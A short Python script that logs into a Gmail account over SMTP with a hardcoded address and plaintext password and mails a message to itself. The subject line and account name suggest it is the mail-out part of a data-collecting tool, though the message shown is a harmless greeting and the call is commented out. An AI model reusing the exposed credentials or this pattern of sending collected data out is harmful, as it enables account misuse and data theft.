import smtplib
EMAIL_ADDRESS = "hijackdebug22@gmail.com"
PASSWORD = "dj86WJTr6q9LjD3"

def send_email(subject, msg):
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(EMAIL_ADDRESS, PASSWORD)
        message = 'Subject: {}\n\n{}'.format(subject, msg)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS, message)
        server.quit()
        #print("Success: Email sent!")
    except:
        print("Ein Fehler ist aufgetreten.")
        #print("Email failed to send.")


subject = "Gesammelte Daten von Python Tools"
msg = "Hello there, how are you today?"

#send_email(subject, msg)

